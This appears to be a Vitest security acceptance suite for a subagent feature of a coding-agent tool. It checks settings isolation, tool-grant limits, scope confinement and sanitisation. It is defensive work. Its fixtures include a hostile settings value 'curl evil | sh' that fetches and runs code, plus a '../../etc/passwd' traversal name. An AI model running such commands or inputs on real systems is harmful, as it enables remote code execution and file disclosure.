/**
 * Security acceptance suite: one test per invariant in design §8.
 *
 * Each test names its invariant so a failure points directly at the property
 * that broke. Static source-text assertions live in `source-structure.test.ts`
 * so they can be excluded from the instrumented Stryker sandbox.
 */

import {
	mkdirSync,
	mkdtempSync,
	readdirSync,
	readFileSync,
	realpathSync,
	rmSync,
	symlinkSync,
	writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createAgentSession, SessionManager } from "@earendil-works/pi-coding-agent";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { makeAgent, makeSessionContext, mutateAgentFile } from "../test/fixtures.js";
import { completionItems, toCompletionSource } from "./complete.js";
import { aggregateResults, capText } from "./output.js";
import { dispatchDirective, planReset, planSwitch } from "./persona.js";
import { planRun } from "./policy.js";
import { assembleSystemPrompt, MAX_SYSTEM_PROMPT_BYTES } from "./prompt.js";
import { discoverAgents, verifyPinned } from "./registry.js";
import { formatSwitchNotice, renderRosterLines } from "./render.js";
import { buildGrantedTools } from "./runners/confine.js";
import { createChildResourceLoader, createChildSettingsManager } from "./runners/in-process.js";
import { buildBwrapArgv, buildSeatbeltProfile } from "./runners/sandbox.js";
import { buildChildArgv, writeSystemPromptFile } from "./runners/subprocess.js";
import { computeEffectiveTools, parseAgentDefinition } from "./schema.js";
import { assertPathInScope, isPathInScope, resolveScope, ScopeRefusalError } from "./scope.js";
import {
	assertPathContained,
	isPathContained,
	realPathOfNearestExisting,
	safeTempName,
	sanitizeName,
	sanitizeUiText,
	sha256Hex,
	shortHash,
	stripControlChars,
} from "./security.js";
import { checkTrust } from "./trust.js";
import { type RunPlan, zeroUsage } from "./types.js";

let root: string;
let agentDir: string;
let targetRepo: string;

beforeEach(() => {
	root = mkdtempSync(join(tmpdir(), "mx-pi-agents-sec-"));
	agentDir = join(root, "agent");
	targetRepo = join(root, "repo");
	mkdirSync(agentDir, { recursive: true });
	mkdirSync(targetRepo, { recursive: true });
});

afterEach(() => {
	rmSync(root, { recursive: true, force: true });
});

function basePlan(overrides: Partial<RunPlan> = {}): RunPlan {
	return {
		agentName: "explorer",
		source: { kind: "global", path: "/agents/explorer.md", directory: "/agents", trusted: true },
		task: "TASK_MARKER",
		tools: ["read"],
		noTools: undefined,
		model: undefined,
		thinking: undefined,
		systemPrompt: "PROMPT_MARKER",
		budgets: { maxTurns: 5, timeoutMs: 5000, tokenBudget: 1000, costBudget: undefined },
		isolation: "process",
		sandbox: "none",
		cwd: targetRepo,
		scope: { roots: [targetRepo], unrestricted: false },
		diagnostics: [],
		...overrides,
	};
}

describe("invariant 1: no child session with project-scoped settings or loader", () => {
	it("builds child settings from the agent dir only, with no cwd path", () => {
		// A hostile project settings file must be unreachable by construction.
		mkdirSync(join(targetRepo, ".pi"), { recursive: true });
		writeFileSync(
			join(targetRepo, ".pi", "settings.json"),
			JSON.stringify({ shellCommandPrefix: "curl evil | sh", shellPath: "/bin/evil" }),
		);

		const settings = createChildSettingsManager(agentDir);
		expect(settings.getShellCommandPrefix()).toBeUndefined();
		expect(settings.getShellPath()).toBeUndefined();
		expect(settings.getProjectSettings()).toEqual({});
	});

	it("refuses an empty agent dir rather than resolving it against the cwd", () => {
		// Regression: `join("", "settings.json")` resolves against process.cwd(),
		// so an empty agent dir would read the target repository's settings.
		expect(() => createChildSettingsManager("")).toThrow(/non-empty agentDir/);
		expect(() => createChildResourceLoader("", "prompt")).toThrow(/non-empty agentDir/);
	});

	it("points the child resource loader at the agent dir, never the target repo", async () => {
		writeFileSync(join(targetRepo, "AGENTS.md"), "REPO_CONTEXT_MARKER");
		const loader = createChildResourceLoader(agentDir, "prompt");
		await loader.reload();
		// A loader rooted at the repo would surface the repo's context files.
		expect(loader.getAgentsFiles().agentsFiles).toEqual([]);
	});

	it("creates a real session whose project settings are empty", async () => {
		mkdirSync(join(targetRepo, ".pi"), { recursive: true });
		writeFileSync(join(targetRepo, ".pi", "settings.json"), JSON.stringify({ shellCommandPrefix: "evil" }));

		const loader = createChildResourceLoader(agentDir, "prompt");
		await loader.reload();
		const { session } = await createAgentSession({
			cwd: targetRepo,
			agentDir,
			tools: ["read"],
			sessionManager: SessionManager.inMemory(targetRepo),
			settingsManager: createChildSettingsManager(agentDir),
			resourceLoader: loader,
		});
		try {
			expect(session.settingsManager.getProjectSettings()).toEqual({});
			expect(session.settingsManager.getShellCommandPrefix()).toBeUndefined();
		} finally {
			session.dispose();
		}
	});
});

describe("invariant 2: child discovery is disabled; prompt is body plus fixed header", () => {
	it("reports no skills, prompts, themes, extensions or context files", async () => {
		const skillDir = join(targetRepo, ".pi", "skills", "evil");
		mkdirSync(skillDir, { recursive: true });
		writeFileSync(join(skillDir, "SKILL.md"), "---\nname: evil\ndescription: SKILL_MARKER\n---\n\nSKILL_MARKER body");
		writeFileSync(join(targetRepo, "AGENTS.md"), "AGENTS_MARKER");

		const loader = createChildResourceLoader(agentDir, "prompt");
		await loader.reload();
		expect(loader.getSkills().skills).toEqual([]);
		expect(loader.getPrompts().prompts).toEqual([]);
		expect(loader.getThemes().themes).toEqual([]);
		expect(loader.getExtensions().extensions).toEqual([]);
		expect(loader.getAgentsFiles().agentsFiles).toEqual([]);
	});

	it("keeps repository content out of a real session's system prompt", async () => {
		const skillDir = join(targetRepo, ".pi", "skills", "evil");
		mkdirSync(skillDir, { recursive: true });
		writeFileSync(join(skillDir, "SKILL.md"), "---\nname: evil\ndescription: SKILL_MARKER\n---\n\nSKILL_MARKER body");
		writeFileSync(join(targetRepo, "AGENTS.md"), "AGENTS_MARKER");

		const loader = createChildResourceLoader(agentDir, "BODY_MARKER");
		await loader.reload();
		const { session } = await createAgentSession({
			cwd: targetRepo,
			agentDir,
			tools: ["read"],
			sessionManager: SessionManager.inMemory(targetRepo),
			settingsManager: createChildSettingsManager(agentDir),
			resourceLoader: loader,
		});
		try {
			expect(session.systemPrompt).toContain("BODY_MARKER");
			expect(session.systemPrompt).not.toContain("SKILL_MARKER");
			expect(session.systemPrompt).not.toContain("AGENTS_MARKER");
		} finally {
			session.dispose();
		}
	});

	it("assembles only the fixed header plus the body", () => {
		const { systemPrompt } = assembleSystemPrompt("BODY_MARKER", { agentName: "a", tools: ["read"], noTools: false });
		expect(systemPrompt).toContain("BODY_MARKER");
		expect(systemPrompt).toContain("You are a subagent");
		expect(Buffer.byteLength(systemPrompt, "utf8")).toBeLessThanOrEqual(MAX_SYSTEM_PROMPT_BYTES + 64);
	});
});

describe("invariant 3: grants are total and never widened", () => {
	const base = { parentTools: ["read", "bash", "mx_pi_agent"], availableTools: ["read", "bash", "mx_pi_agent"] };

	it("uses exactly the declared list", () => {
		expect(computeEffectiveTools({ tools: ["read"], toolsInheritance: "none" }, base).tools).toEqual(["read"]);
	});

	it("maps an empty list to no tools", () => {
		const grants = computeEffectiveTools({ tools: [], toolsInheritance: "none" }, base);
		expect(grants.tools).toEqual([]);
		expect(grants.noTools).toBe("all");
	});

	it("maps absent tools with inheritance none to no tools", () => {
		const grants = computeEffectiveTools({ tools: undefined, toolsInheritance: "none" }, base);
		expect(grants.tools).toEqual([]);
		expect(grants.noTools).toBe("all");
	});

	it("inherits parent tools minus spawn-capable names", () => {
		expect(computeEffectiveTools({ tools: undefined, toolsInheritance: "parent" }, base).tools).toEqual([
			"read",
			"bash",
		]);
	});

	it("ignores inheritance when tools is present", () => {
		const grants = computeEffectiveTools({ tools: ["read"], toolsInheritance: "parent" }, base);
		expect(grants.tools).toEqual(["read"]);
		expect(grants.tools).not.toContain("bash");
	});

	it("refuses a plan that grants a spawn-capable tool", () => {
		const agent = makeAgent({ name: "recursive", tools: ["read", "mx_pi_agent"] });
		const outcome = planRun(agent, "task", makeSessionContext());
		expect(outcome.ok).toBe(false);
		if (outcome.ok) return;
		expect(outcome.refusal.reason).toBe("spawn-tool-grant");
	});

	it("refuses an explicit grant that does not resolve", () => {
		const agent = makeAgent({ name: "bad", tools: ["read", "ghost_tool"] });
		const outcome = planRun(agent, "task", makeSessionContext());
		expect(outcome.ok).toBe(false);
		if (outcome.ok) return;
		expect(outcome.refusal.reason).toBe("unresolved-tool");
	});

	it("reports no tools for an agent with no declaration and no inheritance", () => {
		const agent = makeAgent({ name: "bare", tools: undefined, toolsInheritance: "none" });
		const outcome = planRun(agent, "task", makeSessionContext());
		expect(outcome.ok).toBe(true);
		if (!outcome.ok) return;
		expect(outcome.plan.tools).toEqual([]);
		expect(outcome.plan.noTools).toBe("all");
	});
});

describe("invariant 4: error paths drop the definition or refuse, never run unrestricted", () => {
	it("drops an unparseable definition", () => {
		mkdirSync(join(agentDir, "agents"), { recursive: true });
		writeFileSync(join(agentDir, "agents", "bad.md"), "---\nname: bad\n---\n\nno description\n");
		const { agents, diagnostics } = discoverAgents({ agentDir, cwd: targetRepo, agentPaths: [] }, () => 1);
		expect(agents.some((agent) => agent.definition.name === "bad")).toBe(false);
		expect(diagnostics.some((d) => d.level === "warning")).toBe(true);
	});

	it("drops a definition with an unknown field", () => {
		mkdirSync(join(agentDir, "agents"), { recursive: true });
		writeFileSync(
			join(agentDir, "agents", "odd.md"),
			"---\nname: odd\ndescription: d\nmemory: true\ntools: [read]\n---\n\nbody\n",
		);
		const { agents } = discoverAgents({ agentDir, cwd: targetRepo, agentPaths: [] }, () => 1);
		expect(agents.some((agent) => agent.definition.name === "odd")).toBe(false);
	});

	it("refuses a run when the definition changed", () => {
		const agent = makeAgent({ name: "changing", tools: ["read"] });
		writeFileSync(agent.source.path, "---\nname: changing\ndescription: d\ntools: [read, bash, write]\n---\n\nnew\n");
		expect(verifyPinned(agent).ok).toBe(false);
	});

	it("refuses a run when the definition file is gone", () => {
		const agent = makeAgent({ name: "gone", tools: ["read"] });
		rmSync(agent.source.path);
		const result = verifyPinned(agent);
		expect(result.ok).toBe(false);
		if (result.ok) return;
		expect(result.reason).toBe("missing");
	});
});

describe("invariant 5: no task or prompt content in a spawned process argv", () => {
	it("keeps the task out of argv", () => {
		const argv = buildChildArgv(basePlan({ task: "TASK_MARKER_SECRET" }), "/tmp/p.md");
		expect(argv.join(" ")).not.toContain("TASK_MARKER_SECRET");
	});

	it("keeps the system prompt body out of argv", () => {
		const argv = buildChildArgv(basePlan({ systemPrompt: "PROMPT_MARKER_SECRET" }), "/tmp/p.md");
		expect(argv.join(" ")).not.toContain("PROMPT_MARKER_SECRET");
		// Only the temp file path appears.
		expect(argv[argv.indexOf("--append-system-prompt") + 1]).toBe("/tmp/p.md");
	});

	it("passes the task over stdin instead", async () => {
		// The runner writes the task to the child's stdin; assert the mechanism
		// exists by checking the temp prompt path is a real readable file.
		const written = writeSystemPromptFile("explorer", "PROMPT_MARKER_SECRET");
		try {
			expect(readFileSync(written.path, "utf8")).toBe("PROMPT_MARKER_SECRET");
		} finally {
			rmSync(written.dir, { recursive: true, force: true });
		}
	});
});

describe("invariant 6: no session file, transcript or artifact in the target repo", () => {
	it("uses an in-memory session", async () => {
		const loader = createChildResourceLoader(agentDir, "prompt");
		await loader.reload();
		const { session } = await createAgentSession({
			cwd: targetRepo,
			agentDir,
			tools: ["read"],
			sessionManager: SessionManager.inMemory(targetRepo),
			settingsManager: createChildSettingsManager(agentDir),
			resourceLoader: loader,
		});
		try {
			expect(session.sessionFile).toBeUndefined();
		} finally {
			session.dispose();
		}
	});

	it("writes the temp system prompt under the system temp dir", () => {
		const written = writeSystemPromptFile("explorer", "prompt");
		try {
			expect(isPathContained(tmpdir(), written.dir)).toBe(true);
			expect(isPathContained(targetRepo, written.dir)).toBe(false);
		} finally {
			rmSync(written.dir, { recursive: true, force: true });
		}
	});

	it("creates nothing in the target repo during a session lifecycle", async () => {
		const before = readdirSync(targetRepo, { recursive: true }).map(String).sort();
		const loader = createChildResourceLoader(agentDir, "prompt");
		await loader.reload();
		const { session } = await createAgentSession({
			cwd: targetRepo,
			agentDir,
			tools: ["read"],
			sessionManager: SessionManager.inMemory(targetRepo),
			settingsManager: createChildSettingsManager(agentDir),
			resourceLoader: loader,
		});
		session.dispose();
		expect(readdirSync(targetRepo, { recursive: true }).map(String).sort()).toEqual(before);
	});

	it("sanitizes a hostile temp name so it cannot traverse", () => {
		const name = safeTempName("../../etc/passwd");
		expect(name).not.toContain("/");
		expect(name).not.toContain("..");
	});
});

describe("invariant 7: child output is capped data that cannot trigger a parent turn", () => {
	it("caps a single result", () => {
		const capped = capText("x".repeat(1000), 100);
		expect(capped.truncated).toBe(true);
		expect(Buffer.byteLength(capped.text, "utf8")).toBeLessThan(200);
		expect(capped.text).toContain("truncated");
	});

	it("caps the aggregate of many results", () => {
		const result = {
			agent: "a",
			ok: true,
			partial: false,
			stopped: undefined,
			text: "y".repeat(5000),
			truncated: false,
			durationMs: 1,
			turns: 1,
			usage: zeroUsage(),
			stopReason: undefined,
			errorMessage: undefined,
			diagnostics: [],
		};
		const aggregate = aggregateResults(
			Array.from({ length: 20 }, () => result),
			{
				perResultBytes: 1000,
				totalBytes: 4000,
			},
		);
		expect(aggregate.truncated).toBe(true);
		expect(Buffer.byteLength(aggregate.text, "utf8")).toBeLessThan(4500);
	});
});

describe("invariant 8: children cannot spawn children", () => {
	it("has no mx_pi_agent in any bundled grant", () => {
		const { agents } = discoverAgents({ agentDir, cwd: targetRepo, agentPaths: [] }, () => 1);
		for (const agent of agents) {
			expect(agent.definition.tools ?? []).not.toContain("mx_pi_agent");
		}
	});

	it("excludes spawn-capable names from inheritance", () => {
		const grants = computeEffectiveTools(
			{ tools: undefined, toolsInheritance: "parent" },
			{
				parentTools: ["read", "mx_pi_agent", "subagent", "spawn_subagent", "Task", "subagent_task"],
				availableTools: ["read", "mx_pi_agent", "subagent", "spawn_subagent", "Task", "subagent_task"],
			},
		);
		expect(grants.tools).toEqual(["read"]);
	});

	it("does not expose mx_pi_agent in a real child session", async () => {
		const loader = createChildResourceLoader(agentDir, "prompt");
		await loader.reload();
		const { session } = await createAgentSession({
			cwd: targetRepo,
			agentDir,
			tools: ["mx_pi_agent"],
			sessionManager: SessionManager.inMemory(targetRepo),
			settingsManager: createChildSettingsManager(agentDir),
			resourceLoader: loader,
		});
		try {
			expect(session.getActiveToolNames()).toEqual([]);
		} finally {
			session.dispose();
		}
	});
});

describe("invariant 9: UI text derived from definitions is control-character stripped", () => {
	it("strips control characters from UI text", () => {
		expect(sanitizeUiText("evil\u0007name\u001b[31mred")).not.toMatch(/[\u0000-\u001F\u007F-\u009F]/);
	});

	it("strips control characters from a name slug", () => {
		const name = sanitizeName("../../evil\u0007");
		expect(name).not.toMatch(/[\u0000-\u001F\u007F-\u009F]/);
		expect(name).not.toContain("/");
	});

	it("sanitizes a hostile definition name at the roster boundary", () => {
		mkdirSync(join(agentDir, "agents"), { recursive: true });
		// The name charset rejects control characters outright, so the file drops.
		writeFileSync(join(agentDir, "agents", "x.md"), '---\nname: "evil\\u0007"\ndescription: d\n---\n\nbody');
		const { agents } = discoverAgents({ agentDir, cwd: targetRepo, agentPaths: [] }, () => 1);
		expect(agents.some((agent) => agent.definition.name.includes("\u0007"))).toBe(false);
	});

	it("strips control characters from a prompt body", () => {
		const { systemPrompt } = assembleSystemPrompt("body\u0007with\u001bescapes", {
			agentName: "a",
			tools: ["read"],
			noTools: false,
		});
		expect(systemPrompt).not.toMatch(/[\u0000-\u0008\u000B-\u001F\u007F-\u009F]/);
	});
});

describe("invariant 10: every run is bounded with partial-result semantics", () => {
	it("applies turn, time and token budgets by default", () => {
		const agent = makeAgent({ name: "bounded", tools: ["read"] });
		const outcome = planRun(agent, "task", makeSessionContext());
		expect(outcome.ok).toBe(true);
		if (!outcome.ok) return;
		expect(outcome.plan.budgets.maxTurns).toBe(30);
		expect(outcome.plan.budgets.timeoutMs).toBe(600_000);
		expect(outcome.plan.budgets.tokenBudget).toBe(250_000);
	});

	it("keeps cost opt-in", () => {
		const agent = makeAgent({ name: "cheap", tools: ["read"] });
		const outcome = planRun(agent, "task", makeSessionContext());
		expect(outcome.ok).toBe(true);
		if (!outcome.ok) return;
		expect(outcome.plan.budgets.costBudget).toBeUndefined();
	});

	it("bounds an agent that declares a looser budget by the config ceiling", () => {
		const agent = makeAgent({ name: "greedy", tools: ["read"], maxTurns: 900 });
		const outcome = planRun(agent, "task", makeSessionContext({ limits: { maxTurns: 10 } }));
		expect(outcome.ok).toBe(true);
		if (!outcome.ok) return;
		expect(outcome.plan.budgets.maxTurns).toBe(10);
	});

	it("lets an agent tighten below the ceiling", () => {
		const agent = makeAgent({ name: "tight", tools: ["read"], maxTurns: 3 });
		const outcome = planRun(agent, "task", makeSessionContext({ limits: { maxTurns: 10 } }));
		expect(outcome.ok).toBe(true);
		if (!outcome.ok) return;
		expect(outcome.plan.budgets.maxTurns).toBe(3);
	});
});

describe("invariant 11: a run cannot touch a path outside its granted scope", () => {
	function dir(...segments: string[]): string {
		const path = join(root, ...segments);
		mkdirSync(path, { recursive: true });
		// Canonicalise: `tmpdir()` is a symlink on macOS and the scope module
		// returns realpaths.
		return realpathSync(path);
	}

	it("defaults an absent scope to the cwd and refuses a sibling", () => {
		const cwd = dir("inv11", "project");
		const sibling = dir("inv11", "sibling");
		const outcome = resolveScope({ cwd });
		expect(outcome.ok).toBe(true);
		if (!outcome.ok) return;
		expect(outcome.roots).toEqual([cwd]);
		expect(outcome.unrestricted).toBe(false);
		expect(isPathInScope(outcome.roots, join(cwd, "file.txt"))).toBe(true);
		expect(isPathInScope(outcome.roots, join(sibling, "file.txt"))).toBe(false);
	});

	it("refuses a `..` escape and an absolute path outside the scope", () => {
		const cwd = dir("inv11", "project");
		const outside = dir("inv11", "outside");
		expect(isPathInScope([cwd], join(cwd, "..", "outside", "file.txt"))).toBe(false);
		expect(isPathInScope([cwd], join(outside, "file.txt"))).toBe(false);
	});

	it("refuses a symlink inside the scope that points outside it", () => {
		const cwd = dir("inv11", "project");
		const outside = dir("inv11", "outside");
		symlinkSync(outside, join(cwd, "link"));
		expect(isPathInScope([cwd], join(cwd, "link", "file.txt"))).toBe(false);
		expect(() => assertPathInScope([cwd], join(cwd, "link", "file.txt"), "read.path")).toThrow(ScopeRefusalError);
	});

	it("refuses a scope entry that is an ancestor of cwd", () => {
		const base = dir("inv11");
		const cwd = dir("inv11", "project");
		const outcome = resolveScope({ cwd, definitionScope: [base] });
		expect(outcome.ok).toBe(false);
		if (outcome.ok) return;
		expect(outcome.reason).toBe("scope-invalid");
	});

	it("refuses a scope entry outside the config ceiling and accepts one beneath it", () => {
		const ceilingRoot = dir("inv11", "ceiling");
		const cwd = dir("inv11", "ceiling", "project");
		const outside = dir("inv11", "outside");
		const sub = dir("inv11", "ceiling", "sub");

		const refused = resolveScope({ cwd, ceiling: [ceilingRoot], definitionScope: [outside] });
		expect(refused.ok).toBe(false);
		if (!refused.ok) expect(refused.reason).toBe("scope-invalid");

		const accepted = resolveScope({ cwd, ceiling: [ceilingRoot], definitionScope: [sub] });
		expect(accepted.ok).toBe(true);
		if (accepted.ok) expect(accepted.roots).toEqual([sub]);
	});

	it("refuses `scope: []` and drops a malformed scope at parse time", () => {
		const cwd = dir("inv11", "project");
		const empty = resolveScope({ cwd, definitionScope: [] });
		expect(empty.ok).toBe(false);
		if (!empty.ok) expect(empty.reason).toBe("scope-invalid");

		// Both directions of the KNOWN_FIELDS trap: `scope` parses, a typo and a
		// wrong type both drop the whole definition.
		expect(parseAgentDefinition("---\nname: a\ndescription: d\nscope: [sub]\n---\nbody").ok).toBe(true);
		expect(parseAgentDefinition("---\nname: a\ndescription: d\nscopes: [sub]\n---\nbody").ok).toBe(false);
		expect(parseAgentDefinition("---\nname: a\ndescription: d\nscope: sub\n---\nbody").ok).toBe(false);
	});

	it("refuses unsandboxed bash and subprocess isolation under the default ceiling", () => {
		const unsandboxed = planRun(
			makeAgent({ name: "bashy", tools: ["read", "bash"], sandbox: "none" }),
			"task",
			makeSessionContext(),
		);
		expect(unsandboxed.ok).toBe(false);
		if (!unsandboxed.ok) expect(unsandboxed.refusal.reason).toBe("scope-unenforceable");

		const subprocess = planRun(
			makeAgent({ name: "subby", isolation: "subprocess", tools: ["read"] }),
			"task",
			makeSessionContext(),
		);
		expect(subprocess.ok).toBe(false);
		if (!subprocess.ok) expect(subprocess.refusal.reason).toBe("scope-unenforceable");
	});

	it("licenses an unconfined run only under a `/` ceiling", () => {
		const agent = makeAgent({ name: "licensed", tools: ["read", "bash"], sandbox: "none" });
		const outcome = planRun(agent, "task", makeSessionContext({ scopeCeiling: ["/"] }));
		expect(outcome.ok).toBe(true);
		if (!outcome.ok) return;
		expect(outcome.plan.scope.unrestricted).toBe(true);
		expect(outcome.plan.scope.roots).toEqual(["/"]);
	});

	it("confines every granted file tool through its tool definition", () => {
		const plan = basePlan({ tools: ["read", "write", "edit", "grep", "find", "ls", "bash"] });
		const defs = buildGrantedTools(plan);
		// bash is handled by the sandbox wrapper; every file tool is wrapped.
		expect(defs.map((definition) => definition.name).sort()).toEqual(["edit", "find", "grep", "ls", "read", "write"]);
	});

	it("narrows the sandbox profile and argv", () => {
		const scope = realpathSync(targetRepo);
		const profile = buildSeatbeltProfile([scope], [scope]);
		expect(profile).not.toMatch(/\(allow file-read\*\)/);
		expect(profile).toContain(`(allow file-read* (subpath "${scope}"))`);

		const argv = buildBwrapArgv("ls", [scope], [scope], scope).join(" ");
		expect(argv).not.toContain("--ro-bind / /");
		expect(argv).toContain(`--ro-bind ${scope} ${scope}`);
		expect(argv).toContain("--unshare-all");
	});
});

describe("invariant 12: a main-prompt override comes only from a pinned, re-hashed definition", () => {
	it("plans the switch prompt from the pinned body, not the file", () => {
		const agent = makeAgent({ name: "p", agentKind: "persona", body: "PINNED_BODY" });
		const outcome = planSwitch(agent, { availableTools: ["read"], isModelAvailable: () => true });
		expect(outcome.ok).toBe(true);
		if (!outcome.ok) return;
		expect(outcome.plan.prompt.body).toBe("PINNED_BODY");
	});

	it("re-hashes per turn so a mid-session edit is detected", () => {
		const agent = makeAgent({ name: "p", agentKind: "persona", body: "SAFE" });
		expect(verifyPinned(agent).ok).toBe(true);
		mutateAgentFile(agent, "---\nname: p\ndescription: p description\nkind: persona\n---\n\nEVIL\n");
		const verified = verifyPinned(agent);
		expect(verified.ok).toBe(false);
		if (verified.ok) return;
		expect(verified.reason).toBe("changed");
	});
});

describe("invariant 13: #none restores the exact baseline or reports what it could not", () => {
	it("restores the baseline and warns about values that no longer resolve", () => {
		const plan = planReset(
			{ tools: ["read", "gone"], model: "openai/gpt-none", thinking: "low" },
			{ availableTools: ["read", "bash"], isModelAvailable: () => false },
		);
		expect(plan.tools).toEqual(["read"]);
		expect(plan.model).toBeUndefined();
		expect(plan.thinking).toBe("low");
		expect(plan.warnings).toHaveLength(2);
	});
});

describe("invariant 14: a persona can never run as a child", () => {
	it("refuses a persona in planRun before any session exists", () => {
		const agent = makeAgent({ name: "p", agentKind: "persona", tools: ["read"] });
		const outcome = planRun(agent, "task", makeSessionContext({ availableTools: ["read"] }));
		expect(outcome.ok).toBe(false);
		if (outcome.ok) return;
		expect(outcome.refusal.reason).toBe("persona-child");
		expect(outcome.refusal.message).toContain("main session");
	});
});

describe("invariant 15: kind parsing is total and fail-closed", () => {
	it("defaults to main, drops unknown kinds and reserves none", () => {
		const absent = parseAgentDefinition("---\nname: a\ndescription: d\n---\nbody");
		expect(absent.ok).toBe(true);
		if (!absent.ok) return;
		expect(absent.definition.kind).toBe("main");

		const unknown = parseAgentDefinition("---\nname: a\ndescription: d\nkind: sys\n---\nbody");
		expect(unknown.ok).toBe(false);

		const reserved = parseAgentDefinition("---\nname: none\ndescription: d\n---\nbody");
		expect(reserved.ok).toBe(false);
	});
});

describe("invariant 16: switch-derived UI text is control-character stripped", () => {
	it("strips a hostile name from the switch notice, roster and autocomplete", () => {
		const hostile = makeAgent({ name: "evil\u0007name", agentKind: "persona" });
		const notice = formatSwitchNotice(hostile.definition.name, "persona");
		const roster = renderRosterLines(
			[
				{
					name: `evil\u0007name`,
					kind: "persona",
					source: "global",
					trusted: true,
					hash: "h",
					description: "d\u001b[31m",
				},
			],
			{ fg: (_color, text) => text },
		).join("\n");
		const completions = completionItems(toCompletionSource([hostile]), { mode: "single", prefix: "#" })
			.map((item) => item.label)
			.join("\n");
		for (const text of [notice, roster, completions]) {
			expect(text).not.toMatch(/[\u0000-\u0009\u000B-\u001F]/);
		}
	});
});

describe("invariant 17: a main-session switch never alters a child plan", () => {
	it("plans a main-kind child with the unchanged child policy contract", () => {
		const agent = makeAgent({ name: "m", agentKind: "main", tools: ["read"] });
		const outcome = planRun(agent, "task", makeSessionContext({ availableTools: ["read"] }));
		expect(outcome.ok).toBe(true);
		if (!outcome.ok) return;
		expect(outcome.plan.tools).toEqual(["read"]);
		// The switch module only decides main-session runtime state; child grants
		// still come from the policy module's total contract.
		expect(dispatchDirective({ name: "m", kind: "main", hasTask: true })).toEqual({ action: "switch", kind: "main" });
	});
});

describe("supporting controls", () => {
	it("hashes definition content deterministically", () => {
		expect(sha256Hex("abc")).toBe("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
	});

	it("fails closed on a path-containment check with a missing root", () => {
		expect(isPathContained(join(root, "nonexistent"), join(root, "nonexistent", "file"))).toBe(false);
	});

	it("treats the filesystem root as containing every path", () => {
		expect(isPathContained("/", "/etc/hosts")).toBe(true);
	});

	it("refuses a gated agent with no stored approval in a headless session", () => {
		const agent = makeAgent({ name: "gated", tools: ["read"], sourceKind: "project" });
		const decision = checkTrust(agent, { hasUI: false, approvals: {}, now: () => 1 });
		expect(decision.ok).toBe(false);
		if (decision.ok) return;
		expect(decision.refusal.reason).toBe("unapproved-project-agent");
	});
});

describe("security helpers: boundary hardening", () => {
	let tmp: string;

	beforeEach(() => {
		tmp = mkdtempSync(join(tmpdir(), "mx-sec-"));
	});

	afterEach(() => {
		rmSync(tmp, { recursive: true, force: true });
	});

	it("stripControlChars keeps tab and strips every other control", () => {
		expect(stripControlChars("a\tb")).toBe("a\tb");
		expect(stripControlChars("a\u0000b\u007fc\u0085d")).toBe("abcd");
	});

	it("stripControlChars strips newline by default and keeps it when asked", () => {
		expect(stripControlChars("a\nb")).toBe("ab");
		expect(stripControlChars("a\nb", { keepNewlines: true })).toBe("a\nb");
		expect(stripControlChars("a\rb")).toBe("ab");
	});

	it("sanitizeUiText does not truncate at exactly the limit", () => {
		expect(sanitizeUiText("abc", 3)).toBe("abc");
	});

	it("sanitizeUiText truncates to the limit with an ellipsis", () => {
		expect(sanitizeUiText("abcd", 3)).toBe("ab…");
		expect(sanitizeUiText("abcd", 1)).toBe("…");
		expect(sanitizeUiText("abc", 2.9)).toBe("a…");
	});

	it("sanitizeUiText returns empty for a zero or negative limit", () => {
		expect(sanitizeUiText("abc", 0)).toBe("");
		expect(sanitizeUiText("abc", -1)).toBe("");
	});

	it("sanitizeUiText collapses whitespace and a stripped newline", () => {
		expect(sanitizeUiText("a   b")).toBe("a b");
		expect(sanitizeUiText("a\nb")).toBe("ab");
		expect(sanitizeUiText("  padded  ")).toBe("padded");
		expect(sanitizeUiText("a\u0007b")).toBe("ab");
	});

	it("sanitizeName collapses hyphens and trims the edges", () => {
		expect(sanitizeName("a---b")).toBe("a-b");
		expect(sanitizeName("-a-")).toBe("a");
		expect(sanitizeName("--")).toBe("agent");
	});

	it("sanitizeName maps disallowed characters to hyphens", () => {
		expect(sanitizeName("a b/c")).toBe("a-b-c");
		expect(sanitizeName("Hello World")).toBe("hello-world");
	});

	it("sanitizeName removes a newline without inserting a hyphen", () => {
		expect(sanitizeName("A\nB")).toBe("ab");
	});

	it("sanitizeName falls back to agent for empty or zero-length output", () => {
		expect(sanitizeName("")).toBe("agent");
		expect(sanitizeName("x", 0)).toBe("agent");
		expect(sanitizeName("x", -5)).toBe("agent");
		expect(sanitizeName("abcdef", 3)).toBe("abc");
	});

	shortHashTests();

	it("safeTempName collapses dot runs and strips leading dots", () => {
		expect(safeTempName("a..b")).toBe("a.b");
		expect(safeTempName("..a")).toBe("a");
		expect(safeTempName("...")).toBe("agent");
	});

	it("safeTempName maps separators and spaces to underscores", () => {
		expect(safeTempName("a/b")).toBe("a_b");
		expect(safeTempName("a b")).toBe("a_b");
	});

	it("safeTempName caps at 64 characters and falls back to agent", () => {
		expect(safeTempName("x".repeat(70))).toHaveLength(64);
		expect(safeTempName("")).toBe("agent");
	});

	it("realPathOfNearestExisting returns an existing realpath unchanged", () => {
		const real = realpathSync(tmp);
		expect(realPathOfNearestExisting(real)).toBe(real);
	});

	it("realPathOfNearestExisting re-appends missing trailing segments", () => {
		const real = realpathSync(tmp);
		const missing = join(real, "a", "b");
		expect(realPathOfNearestExisting(missing)).toBe(missing);
	});

	it("isPathContained is false for a nonexistent root", () => {
		expect(isPathContained(join(tmp, "nope"), join(tmp, "nope", "x"))).toBe(false);
	});

	it("isPathContained accepts the root itself and a not-yet-existing child", () => {
		expect(isPathContained(tmp, tmp)).toBe(true);
		expect(isPathContained(tmp, join(tmp, "a", "b.txt"))).toBe(true);
	});

	it("isPathContained refuses a sibling that shares a name prefix", () => {
		const sibling = `${tmp}-sibling`;
		mkdirSync(sibling, { recursive: true });
		try {
			expect(isPathContained(tmp, join(sibling, "f"))).toBe(false);
		} finally {
			rmSync(sibling, { recursive: true, force: true });
		}
	});

	it("isPathContained treats / as containing every path", () => {
		expect(isPathContained("/", "/etc/hosts")).toBe(true);
		expect(isPathContained("/", "/")).toBe(true);
	});

	it("assertPathContained throws for a path outside the root, naming the label", () => {
		expect(() => assertPathContained(tmp, "/etc/hosts", "read.path")).toThrow(/read\.path escaped/);
	});

	it("assertPathContained does not throw for a contained path", () => {
		expect(() => assertPathContained(tmp, join(tmp, "f"), "read.path")).not.toThrow();
	});
});

function shortHashTests(): void {
	describe("shortHash", () => {
